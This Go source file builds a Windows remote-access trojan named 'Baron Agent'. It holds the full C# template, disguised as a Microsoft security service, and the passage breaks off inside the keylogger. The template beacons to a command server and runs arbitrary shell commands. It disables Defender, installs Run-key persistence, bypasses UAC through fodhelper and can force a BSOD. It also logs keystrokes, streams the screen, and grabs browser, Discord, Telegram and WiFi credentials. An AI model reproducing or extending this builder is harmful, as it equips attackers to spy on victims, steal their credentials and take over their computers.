package service

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
	"time"
)

// BuilderService handles C# agent source generation
type BuilderService struct{}

// BuildParams represents the configuration for the agent
type BuildParams struct {
	ServerURL       string `json:"server"`
	Name            string `json:"name"`
	ID              string `json:"id"`
	BeaconInterval  int    `json:"beacon"`
	Hidden          bool   `json:"hidden"`
	Persistence     bool   `json:"persist"`
	AntiKill        bool   `json:"bsod"`
	DisableDefender bool   `json:"defender"`
	FakeError       bool   `json:"fake_error"`
	FakeErrorMsg    string `json:"fake_error_msg"`
	AntiAnalysis    bool   `json:"anti"`
	Debug           bool   `json:"debug"`
	BuildSig        string `json:"-"`
	StrKeyHex       string `json:"-"`
	EncServer       string
	EncID           string
	EncName         string
	EncCommKey      string
	EncFakeMsg      string
}

// GenerateSource generates the C# source code for the agent using the original Baron logic
func (s *BuilderService) GenerateSource(p BuildParams) (string, error) {
	tmpl, err := template.New("agent").Parse(csharpTemplate)
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, p); err != nil {
		return "", err
	}

	return buf.String(), nil
}

// EncryptString XOR encrypts a string and returns base64
func (s *BuilderService) EncryptString(text string, key []byte) string {
	textBytes := []byte(text)
	encrypted := make([]byte, len(textBytes))
	for i := 0; i < len(textBytes); i++ {
		encrypted[i] = textBytes[i] ^ key[i%len(key)]
	}
	return base64.StdEncoding.EncodeToString(encrypted)
}

// PrepareParams encrypts sensitive fields and prepares the BuildParams for the template
func (s *BuilderService) PrepareParams(p *BuildParams) {
	// Generate random keys
	strKey := make([]byte, 16)
	rand.Read(strKey)
	p.StrKeyHex = hex.EncodeToString(strKey)

	commKey := make([]byte, 32)
	rand.Read(commKey)
	commKeyHex := hex.EncodeToString(commKey)

	// Encrypt fields
	p.EncServer = s.EncryptString(p.ServerURL, strKey)
	p.EncID = s.EncryptString(p.ID, strKey)
	p.EncName = s.EncryptString(p.Name, strKey)
	p.EncCommKey = s.EncryptString(commKeyHex, strKey)
	p.EncFakeMsg = s.EncryptString(p.FakeErrorMsg, strKey)
}

// Compile compiles the C# source into an executable.
// Tries dotnet build first, falls back to mcs (Mono).
// Enforces a 60-second compilation timeout.
func (s *BuilderService) Compile(source string, name string, hidden bool) (string, error) {
	tmpDir := filepath.Join(os.TempDir(), "baron_builds")
	os.MkdirAll(tmpDir, 0755)

	sourcePath := filepath.Join(tmpDir, name+".cs")
	exePath := filepath.Join(tmpDir, name+".exe")

	if err := os.WriteFile(sourcePath, []byte(source), 0644); err != nil {
		return "", err
	}
	// Always clean up the source file after compilation attempt
	defer os.Remove(sourcePath)

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	target := "exe"
	if hidden {
		target = "winexe"
	}

	cmd := exec.CommandContext(ctx, "mcs",
		"-unsafe",
		"-target:"+target,
		"-optimize+",
		"-out:"+exePath,
		"-r:System.dll",
		"-r:System.Net.Http.dll",
		"-r:System.Drawing.dll",
		"-r:System.Windows.Forms.dll",
		"-r:System.Management.dll",
		"-r:System.Security.dll",
		"-r:System.IO.Compression.dll",
		"-r:System.IO.Compression.FileSystem.dll",
		"-warn:0",
		sourcePath,
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return "compilation timed out after 60s", err
		}
		return string(output), err
	}

	return exePath, nil
}

// csharpTemplate is the full C# template extracted and improved from Baron C2
const csharpTemplate = `
// ==================================================================
// BARON Agent v4.0 -- Generated Build
// Build Signature: {{.BuildSig}}
// ==================================================================

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Net.WebSockets;
using System.Threading;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Threading.Tasks;
using System.IO.Compression;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Management;
using System.Windows.Forms;

[assembly: System.Reflection.AssemblyTitle("Windows Security Health Service")]
[assembly: System.Reflection.AssemblyDescription("Microsoft Windows Security")]
[assembly: System.Reflection.AssemblyCompany("Microsoft Corporation")]
[assembly: System.Reflection.AssemblyProduct("Microsoft Windows Operating System")]
[assembly: System.Reflection.AssemblyCopyright("Microsoft Corporation. All rights reserved.")]
[assembly: System.Reflection.AssemblyVersion("10.0.19041.1")]

namespace WinSecHealthSvc
{
    // ---- WASAPI COM Interfaces ----
    [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
    class MMDeviceEnumerator { }

    [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDeviceEnumerator {
        int EnumAudioEndpoints(int dataFlow, int stateMask, out IntPtr devices);
        int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice device);
    }

    [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDevice {
        int Activate([MarshalAs(UnmanagedType.LPStruct)] Guid iid, int clsCtx,
            IntPtr activationParams, [MarshalAs(UnmanagedType.IUnknown)] out object obj);
    }

    [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioClient {
        int Initialize(int shareMode, int streamFlags, long bufferDuration,
            long periodicity, IntPtr format, [MarshalAs(UnmanagedType.LPStruct)] Guid sessionGuid);
        int GetBufferSize(out uint numBufferFrames);
        int GetStreamLatency(out long latency);
        int GetCurrentPadding(out uint numPaddingFrames);
        int IsFormatSupported(int shareMode, IntPtr format, out IntPtr closestMatch);
        int GetMixFormat(out IntPtr format);
        int GetDevicePeriod(out long defaultPeriod, out long minimumPeriod);
        int Start();
        int Stop();
        int Reset();
        int SetEventHandle(IntPtr eventHandle);
        int GetService([MarshalAs(UnmanagedType.LPStruct)] Guid iid,
            [MarshalAs(UnmanagedType.IUnknown)] out object obj);
    }

    [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioCaptureClient {
        int GetBuffer(out IntPtr dataPtr, out uint numFramesAvailable,
            out uint flags, out ulong devicePosition, out ulong qpcPosition);
        int ReleaseBuffer(uint numFramesRead);
        int GetNextPacketSize(out uint numFramesInNextPacket);
    }

    [StructLayout(LayoutKind.Sequential)]
    struct WAVEFORMATEX {
        public ushort wFormatTag;
        public ushort nChannels;
        public uint nSamplesPerSec;
        public uint nAvgBytesPerSec;
        public ushort nBlockAlign;
        public ushort wBitsPerSample;
        public ushort cbSize;
    }

    static class Agent
    {
        // ---- Encrypted Configuration ----
        static readonly byte[] _strKey = HexToBytes("{{.StrKeyHex}}");
        static string _server;
        static string _clientId;
        static string _processName;
        static string _commKeyHex;
        static int _beaconInterval = {{.BeaconInterval}};
        static bool _debug = {{if or .Debug (not .Hidden)}}true{{else}}false{{end}};

        static void Log(string msg) {
            if(_debug) {
                try {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.Write("[" + DateTime.Now.ToString("HH:mm:ss") + "] ");
                    Console.ResetColor();
                    Console.WriteLine(msg);
                } catch {}
            }
        }

        // ---- State ----
        static bool _running = true;
        static bool _screenStreaming = false;
        static bool _keylogRunning = false;
        static StringBuilder _keylog = new StringBuilder();

        // ---- String Decryption (XOR) ----
        static string DecStr(string b64) {
            byte[] enc = Convert.FromBase64String(b64);
            byte[] dec = new byte[enc.Length];
            for (int i = 0; i < enc.Length; i++)
                dec[i] = (byte)(enc[i] ^ _strKey[i % _strKey.Length]);
            return Encoding.UTF8.GetString(dec);
        }

        static byte[] HexToBytes(string hex) {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        // ---- Hidden PowerShell Execution ----
        static void RunHiddenPS(string cmd) {
            try {
                var p = new ProcessStartInfo {
                    FileName = "powershell.exe",
                    Arguments = "-NoP -NonI -W Hidden -Enc " +
                        Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(cmd)),
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                Process.Start(p);
            } catch {}
        }

        // ---- HMAC Signing ----
        static string SignMessage(string data) {
            if (string.IsNullOrEmpty(_commKeyHex)) return "";
            byte[] key = HexToBytes(_commKeyHex);
            using (var hmac = new System.Security.Cryptography.HMACSHA256(key)) {
                byte[] hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(data));
                return BitConverter.ToString(hash).Replace("-", "").ToLower();
            }
        }

        // ==== MAIN ====
        [STAThread]
        static void Main() {
            try {
                // Ensure we see something immediately
                Console.WriteLine(">>> Baron Agent Initializing...");
                
                // Force TLS 1.2
                System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072;
                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

                // Decrypt config
                _server = DecStr("{{.EncServer}}");
                _processName = DecStr("{{.EncName}}");
                _commKeyHex = DecStr("{{.EncCommKey}}");
                
                Log("Config decrypted. Server: " + _server);

                // Prevent multiple instances with a unique ID based on the server URL
                string mName = "Global\\Baron_" + _server.GetHashCode().ToString("X");
                bool createdNew;
                using (var mutex = new System.Threading.Mutex(true, mName, out createdNew)) {
                    if (!createdNew) {
                        Log("Another instance is already running. Exiting.");
                        Thread.Sleep(2000);
                        return;
                    }

                    _clientId = GetHWID();
                    Log("=== AGENT STARTING [" + _clientId + "] ===");

                    {{if .FakeError}}
                    new Thread(() => MessageBox.Show(DecStr("{{.EncFakeMsg}}"), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)).Start();
                    {{end}}

                    bool registered = false;
                    while (_running) {
                        try { 
                            if (!registered) {
                                registered = Register();
                            }
                            
                            if (registered) {
                                Beacon(); 
                            }
                        } catch (Exception ex) { Log("Loop Error: " + ex.Message); }
                        Thread.Sleep(_beaconInterval + new Random().Next(1000));
                    }
                }
            } catch (Exception ex) {
                Console.WriteLine("CRITICAL ERROR: " + ex.ToString());
                Thread.Sleep(10000);
            }
        }

        // ==== COMMS ====
        static string Post(string url, string json) {
            try {
                url = url.Replace("//api", "/api");
                Log("POST " + url);
                var req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                req.ContentType = "application/json";
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
                req.Timeout = 15000;

                string sig = SignMessage(json);
                if (!string.IsNullOrEmpty(sig)) req.Headers.Add("X-Signature", sig);
                req.Headers.Add("X-Client-ID", _clientId);

                byte[] data = Encoding.UTF8.GetBytes(json);
                req.ContentLength = data.Length;
                using (var s = req.GetRequestStream()) s.Write(data, 0, data.Length);
                using (var r = (HttpWebResponse)req.GetResponse()) {
                    Log("RESPONSE: " + (int)r.StatusCode);
                    using (var sr = new StreamReader(r.GetResponseStream())) return sr.ReadToEnd();
                }
            } catch (Exception ex) { 
                Log("COMMS ERROR: " + ex.Message);
                return "{}"; 
            }
        }

        static void Beacon() {
            try {
                string json = "{\"id\":\"" + Esc(_clientId) + "\",\"hwid\":\"" + Esc(GetHWID()) + "\"}";
                string resp = Post(_server + "/api/agent/beacon", json);

                if (resp.Length > 10) Log("RAW RESPONSE: " + resp);

                if (resp.Contains("\"id\"")) {
                    Log("Received tasks from server.");
                    int pos = 0;
                    while ((pos = resp.IndexOf("{\"id\":", pos)) != -1) {
                        int end = resp.IndexOf("}", pos);
                        if (end == -1) break;
                        string t = resp.Substring(pos, end - pos + 1);
                        pos = end;

                        string tid = GetJsonVal(t, "id");
                        string cmd = GetJsonVal(t, "cmd");
                        if (!string.IsNullOrEmpty(tid) && !string.IsNullOrEmpty(cmd)) {
                            ExecuteTask(tid, cmd);
                        }
                    }
                }
            } catch (Exception ex) { Log("BEACON ERROR: " + ex.Message); }
        }

        static bool Register() {
            try {
                Log("Attempting registration...");
                string hostname = Environment.MachineName;
                string username = Environment.UserName;
                string os = Environment.OSVersion.ToString();
                bool isAdmin = false;
                try {
                    isAdmin = new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                } catch {}
                
                string hwid = GetHWID();

                string json = "{\"id\":\"" + Esc(_clientId) + "\",\"hostname\":\"" + Esc(hostname) + "\",\"username\":\"" + Esc(username) + "\",\"os\":\"" + Esc(os) + "\",\"is_admin\":" + (isAdmin ? "true" : "false") + ",\"version\":\"4.0\",\"fingerprint\":\"" + Esc(hwid) + "\"}";
                string resp = Post(_server + "/api/agent/register", json);
                if(resp.Contains("\"ok\":true")) {
                    Log("Registration SUCCESSFUL.");
                    string newId = GetJsonVal(resp, "id");
                    if (!string.IsNullOrEmpty(newId)) {
                        _clientId = newId;
                        Log("ID Synchronized: " + _clientId);
                    }
                    return true;
                }
                else Log("Registration FAILED: " + resp);
            } catch (Exception ex) { Log("REGISTER ERROR: " + ex.Message); }
            return false;
        }

        static string GetHWID() {
            try {
                string mId = "";
                try {
                    using (var mc = new ManagementClass("Win32_Processor")) {
                        foreach (var mo in mc.GetInstances()) {
                            mId += mo.Properties["ProcessorId"].Value.ToString();
                            break;
                        }
                    }
                } catch {}
                
                if (string.IsNullOrEmpty(mId)) {
                    mId = Environment.MachineName + "_" + Environment.UserName + "_" + Environment.ProcessorCount;
                }
                
                string hash = SignMessage(mId);
                if (string.IsNullOrEmpty(hash) || hash.Length < 8) {
                    // Fallback to simple hash if HMAC fails
                    return "ID-" + Math.Abs(mId.GetHashCode()).ToString("X");
                }
                
                return hash.Substring(0, 8);
            } catch { 
                return "AGENT-" + Guid.NewGuid().ToString().Substring(0, 8).ToUpper(); 
            }
        }

        static string GetJsonVal(string json, string key) {
            try {
                string pattern = "\"" + key + "\":\"";
                int start = json.IndexOf(pattern);
                if (start == -1) return "";
                start += pattern.Length;
                int end = json.IndexOf("\"", start);
                if (end == -1) return "";
                return json.Substring(start, end - start);
            } catch { return ""; }
        }

        static void ExecuteTask(string tid, string command) {
            new Thread(() => {
            try {
                Log("TASK [" + tid + "]: " + command);
                string output = "";
                string[] parts = command.Split(new char[] { ' ' }, 2);
                string cmdName = parts[0].ToLower().Trim();
                string args = parts.Length > 1 ? parts[1] : "";

                switch (cmdName) {
                    case "shell":
                        try {
                            var p2 = new Process { StartInfo = new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c " + args, UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true, CreateNoWindow = true } };
                            p2.Start(); p2.WaitForExit(15000);
                            output = p2.StandardOutput.ReadToEnd() + p2.StandardError.ReadToEnd();
                            if (string.IsNullOrWhiteSpace(output)) output = "[no output]";
                        } catch (Exception ex) { output = "shell error: " + ex.Message; }
                        break;
                    case "info":
                        output = GetSysInfo();
                        break;
                    case "processes":
                    case "ps_list":
                        output = GetProcessList();
                        break;
                    case "ps_kill":
                        try { Process.GetProcessById(int.Parse(args)).Kill(); output = "Killed PID " + args; } catch (Exception e) { output = "Kill failed: " + e.Message; }
                        break;
                    case "ps_suspend":
                        try { NtSuspendProcess(Process.GetProcessById(int.Parse(args)).Handle); output = "Suspended PID " + args; } catch (Exception e) { output = "Suspend failed: " + e.Message; }
                        break;
                    case "ps_resume":
                        try { NtResumeProcess(Process.GetProcessById(int.Parse(args)).Handle); output = "Resumed PID " + args; } catch (Exception e) { output = "Resume failed: " + e.Message; }
                        break;
                    case "defender":
                        RunHiddenPS("Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true");
                        try { var rk2 = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"); rk2.SetValue("DisableAntiSpyware",1,Microsoft.Win32.RegistryValueKind.DWord); rk2.Close(); } catch {}
                        output = "Defender disabled";
                        break;
                    case "screenshot":
                        output = TakeScreenshot();
                        break;
                    case "screen_start":
                        if (!_screenStreaming) { _screenStreaming = true; new Thread(ScreenStreamLoop) { IsBackground = true }.Start(); output = "Stream started"; }
                        else output = "Already streaming";
                        break;
                    case "screen_stop":
                        _screenStreaming = false; output = "Stream stopped";
                        break;
                    case "keylogger":
                    case "keylog_start":
                        if (!_keylogRunning) { _keylogRunning = true; _keylog.Clear(); new Thread(KeyloggerLoop) { IsBackground = true }.Start(); new Thread(KeyloggerStreamer) { IsBackground = true }.Start(); output = "Keylogger started"; }
                        else output = "Already running";
                        break;
                    case "keylog_stop":
                        _keylogRunning = false; output = "Keylogger stopped:\n" + _keylog.ToString(); _keylog.Clear();
                        break;
                    case "keylog_dump":
                        output = "Keylog:\n" + _keylog.ToString();
                        break;
                    case "browsers":
                        output = GrabBrowsers();
                        break;
                    case "grabber":
                        output = GrabAll();
                        break;
                    case "discord":
                        output = GrabDiscord();
                        break;
                    case "telegram":
                        output = GrabTelegram();
                        break;
                    case "wifi":
                        output = GrabWifi();
                        break;
                    case "persist_install":
                        try {
                            string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
                            var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                            rk?.SetValue("WindowsSecurityHealthService", "\"" + me + "\""); rk?.Close();
                            string sf = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                            File.Copy(me, Path.Combine(sf, Path.GetFileName(me)), true);
                            output = "Persistence installed";
                        } catch (Exception ex) { output = "persist error: " + ex.Message; }
                        break;
                    case "uac_bypass":
                        try {
                            string me2 = System.Reflection.Assembly.GetExecutingAssembly().Location;
                            var k = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command");
                            k.SetValue("", me2); k.SetValue("DelegateExecute", ""); k.Close();
                            Process.Start(new ProcessStartInfo { FileName = "fodhelper.exe", CreateNoWindow = true, UseShellExecute = false });
                            Thread.Sleep(2000);
                            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
                            output = "UAC bypass attempted";
                        } catch (Exception ex) { output = "uac error: " + ex.Message; }
                        break;
                    case "bsod":
                        try { bool pb; RtlSetProcessIsCritical(true, out pb, false); Process.GetCurrentProcess().Kill(); } catch {}
                        output = "BSOD triggered";
                        break;
                    case "msg":
                        new Thread(() => MessageBox.Show(args, "System Message", MessageBoxButtons.OK, MessageBoxIcon.Information)).Start();
                        output = "Message displayed";
                        break;
                    case "kill":
                        _running = false; output = "Agent terminated";
                        break;
                    case "uninstall":
                        try {
                            Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run",true)?.DeleteValue("WindowsSecurityHealthService",false);
                            _running = false;
                            string me3 = System.Reflection.Assembly.GetExecutingAssembly().Location;
                            Process.Start(new ProcessStartInfo { FileName="cmd.exe", Arguments="/c ping 127.0.0.1 -n 3 & del /f /q \""+me3+"\"", CreateNoWindow=true, UseShellExecute=false });
                            output = "Uninstalling";
                            Res(tid, output);
                            new Thread(() => { Thread.Sleep(1000); Environment.Exit(0); }) { IsBackground = true }.Start();
                            return;
                        } catch (Exception ex) { output = "uninstall error: " + ex.Message; }
                        break;
                    default:
                        output = "Unknown command: " + cmdName;
                        break;
                }
                Res(tid, output);
            } catch (Exception ex) { Res(tid, "Fatal: " + ex.Message); }
            }) { IsBackground = true }.Start();
        }

        static void Res(string tid, string data) {
            string json = "{\"id\":\"" + Esc(_clientId) + "\",\"task_id\":\"" + Esc(tid) + "\",\"data\":\"" + Esc(data) + "\"}";
            Post(_server + "/api/agent/result", json);
        }

        static string Esc(string s) {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
        }

        // ==== MODULES ====
        {{if .Persistence}}
        static void InstallPersistenceQuiet() {
            try {
                string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                if (rk != null) { rk.SetValue("WindowsSecurityHealthService", "\"" + me + "\""); rk.Close(); }
            } catch {}
        }
        {{end}}


        {{if .AntiKill}}
        static void StartAntiKill() {
            try { bool old; RtlSetProcessIsCritical(true, out old, false); } catch {}
        }
        {{end}}


        {{if .DisableDefender}}
        static void DisableDefender() {
            try {
                var psi = new ProcessStartInfo {
                    FileName = "powershell.exe",
                    Arguments = "-WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                Process.Start(psi);
            } catch {}
        }
        {{end}}

        {{if .AntiAnalysis}}
        static void AntiAnalysisCheck() {
            if (System.Diagnostics.Debugger.IsAttached) Environment.Exit(0);
        }
        {{end}}

        // ─────────────────────────────────────────────────────────────
        // P/Invoke declarations (always present)
        // ─────────────────────────────────────────────────────────────
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, KbHookProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        static extern int GetMessage(out KbMsg lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
        [DllImport("user32.dll")]
        static extern bool TranslateMessage([In] ref KbMsg lpMsg);
        [DllImport("user32.dll")]
        static extern IntPtr DispatchMessage([In] ref KbMsg lpmsg);
        [DllImport("ntdll.dll", PreserveSig = false)]
        public static extern void NtSuspendProcess(IntPtr processHandle);
        [DllImport("ntdll.dll", PreserveSig = false)]
        public static extern void NtResumeProcess(IntPtr processHandle);
        [DllImport("ntdll.dll")] static extern int RtlSetProcessIsCritical(bool n, out bool o, bool p2);
        delegate IntPtr KbHookProc(int n, IntPtr w, IntPtr l);
        [StructLayout(LayoutKind.Sequential)]
        struct KbMsg { public IntPtr h; public uint msg; public IntPtr w; public IntPtr l; public uint t; public int x; public int y; }
        static IntPtr _hook = IntPtr.Zero;
        static KbHookProc _kbProc;

        // ─────────────────────────────────────────────────────────────
        static string GetSysInfo() {
            var sb = new StringBuilder();
            sb.AppendLine("Host:  " + Environment.MachineName);
            sb.AppendLine("User:  " + Environment.UserDomainName + "\\" + Environment.UserName);
            sb.AppendLine("OS:    " + Environment.OSVersion + " " + (IntPtr.Size == 8 ? "x64" : "x86"));
            sb.AppendLine("CPUs:  " + Environment.ProcessorCount);
            bool adm = false;
            try { adm = new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator); } catch {}
            sb.AppendLine("Admin: " + adm);
            try { using (var mc = new ManagementClass("Win32_ComputerSystem")) foreach (ManagementObject mo in mc.GetInstances()) sb.AppendLine("RAM MB:" + Convert.ToUInt64(mo["TotalPhysicalMemory"])/1024/1024); } catch {}
            try { using (var mc = new ManagementClass("Win32_Processor")) foreach (ManagementObject mo in mc.GetInstances()) sb.AppendLine("CPU:   " + mo["Name"]); } catch {}
            try { using (var mc = new ManagementClass("Win32_VideoController")) foreach (ManagementObject mo in mc.GetInstances()) sb.AppendLine("GPU:   " + mo["Caption"]); } catch {}
            foreach (var d in DriveInfo.GetDrives()) { try { if (d.IsReady) sb.AppendLine(d.Name + " " + d.DriveType + " " + d.TotalFreeSpace/1073741824 + "GB/" + d.TotalSize/1073741824 + "GB"); } catch {} }
            return sb.ToString();
        }

        static string GetProcessList() {
            var sb = new StringBuilder("[");
            var procs = Process.GetProcesses();
            Array.Sort(procs, (a, b2) => a.Id.CompareTo(b2.Id));
            bool first = true;
            foreach (var pr in procs) {
                try { 
                    if (!first) sb.Append(",");
                    sb.Append("{\"pid\":"+pr.Id+",\"name\":\""+pr.ProcessName.Replace("\\","")+"\",\"mem\":"+Math.Round(pr.WorkingSet64/1048576.0,1)+"}");
                    first = false;
                } catch {}
            }
            sb.Append("]");
            return sb.ToString();
        }

        static string TakeScreenshot() {
            try {
                var b = Screen.PrimaryScreen.Bounds;
                using (var bmp = new Bitmap(b.Width, b.Height)) {
                    using (var g = Graphics.FromImage(bmp)) g.CopyFromScreen(b.Location, Point.Empty, b.Size);
                    using (var ms = new System.IO.MemoryStream()) { bmp.Save(ms, ImageFormat.Jpeg); return Convert.ToBase64String(ms.ToArray()); }
                }
            } catch (Exception ex) { return "screenshot error: " + ex.Message; }
        }

        static async void ScreenStreamLoop() {
            var ws = new ClientWebSocket();
            try {
                string wsUrl = _server.Replace("http", "ws") + "/api/agent/stream_ws?id=" + _clientId;
                await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
            } catch { return; }

            var ep = new EncoderParameters(1);
            ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 60L);
            var jc = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
            
            int grid = 32;
            var bounds = Screen.PrimaryScreen.Bounds;
            Dictionary<int, ulong> hashes = new Dictionary<int, ulong>();
            DateTime lastKeyFrame = DateTime.MinValue;
            var sw = new Stopwatch();

            while (_screenStreaming && ws.State == WebSocketState.Open) {
                sw.Restart();
                try {
                    bool forceKeyFrame = (DateTime.UtcNow - lastKeyFrame).TotalSeconds > 5;
                    using (var fullBmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb)) {
                        using (var g = Graphics.FromImage(fullBmp)) g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                        
                        if (forceKeyFrame) {
                            lastKeyFrame = DateTime.UtcNow;
                            using (var ms = new MemoryStream()) {
                                fullBmp.Save(ms, jc, ep);
                                byte[] jpeg = ms.ToArray();
                                // [Type:1][Codec:1][PLen:2] [W:2][H:2] [JPEG...]
                                byte[] pkt = new byte[8 + jpeg.Length];
                                pkt[0] = 0x01; // Key
                                pkt[1] = 0x00; // Jpeg
                                BitConverter.GetBytes((ushort)(jpeg.Length + 4)).CopyTo(pkt, 2);
                                BitConverter.GetBytes((ushort)bounds.Width).CopyTo(pkt, 4);
                                BitConverter.GetBytes((ushort)bounds.Height).CopyTo(pkt, 6);
                                Buffer.BlockCopy(jpeg, 0, pkt, 8, jpeg.Length);
                                await ws.SendAsync(new ArraySegment<byte>(pkt), WebSocketMessageType.Binary, true, CancellationToken.None);
                            }
                            hashes.Clear();
                        }

                        for (int y = 0; y < bounds.Height; y += grid) {
                            for (int x = 0; x < bounds.Width; x += grid) {
                                int w = Math.Min(grid, bounds.Width - x);
                                int h = Math.Min(grid, bounds.Height - y);
                                int blockId = (y / grid) * 1000 + (x / grid);

                                using (var block = fullBmp.Clone(new Rectangle(x, y, w, h), fullBmp.PixelFormat)) {
                                    ulong hash = 5381;
                                    var bd = block.LockBits(new Rectangle(0,0,w,h), ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);
                                    unsafe {
                                        uint* p = (uint*)bd.Scan0;
                                        int len = w * h;
                                        for(int i=0; i<len; i++) hash = ((hash << 5) + hash) + p[i];
                                    }
                                    block.UnlockBits(bd);

                                    if (!hashes.ContainsKey(blockId) || hashes[blockId] != hash) {
                                        hashes[blockId] = hash;
                                        using (var ms = new MemoryStream()) {
                                            block.Save(ms, jc, ep);
                                            byte[] jpeg = ms.ToArray();
                                            // [Type:1][Codec:1][PLen:2] [X:2][Y:2][W:2][H:2] [JPEG...]
                                            byte[] pkt = new byte[12 + jpeg.Length];
                                            pkt[0] = 0x02; // Delta
                                            pkt[1] = 0x00; // Jpeg
                                            BitConverter.GetBytes((ushort)(jpeg.Length + 8)).CopyTo(pkt, 2);
                                            BitConverter.GetBytes((ushort)x).CopyTo(pkt, 4);
                                            BitConverter.GetBytes((ushort)y).CopyTo(pkt, 6);
                                            BitConverter.GetBytes((ushort)w).CopyTo(pkt, 8);
                                            BitConverter.GetBytes((ushort)h).CopyTo(pkt, 10);
                                            Buffer.BlockCopy(jpeg, 0, pkt, 12, jpeg.Length);
                                            await ws.SendAsync(new ArraySegment<byte>(pkt), WebSocketMessageType.Binary, true, CancellationToken.None);
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch {}
                sw.Stop();
                await Task.Delay(Math.Max(5, 33 - (int)sw.ElapsedMilliseconds));
            }
            try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch {}
        }

        static void KeyloggerStreamer() {
            int lastLen = 0;
            while (_keylogRunning) {
                Thread.Sleep(250);
                if (_keylog.Length > lastLen) {
                    string txt = _keylog.ToString();
                    if(txt.Length > lastLen) {
                        string chunk = txt.Substring(lastLen);
                        lastLen = txt.Length;
                        string json = "{\"id\":\"" + Esc(_clientId) + "\",\"tag\":\"keylog_stream\",\"data\":\"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(chunk)) + "\"}";
                        Post(_server + "/api/agent/result", json);
                    }
                }
            }
        }

        static void KeyloggerLoop() {
            try {
                _kbProc = (n, w, l) => {
                    if (n >= 0 && (int)w == 0x100) {
                        int vk = Marshal.ReadInt32(l);
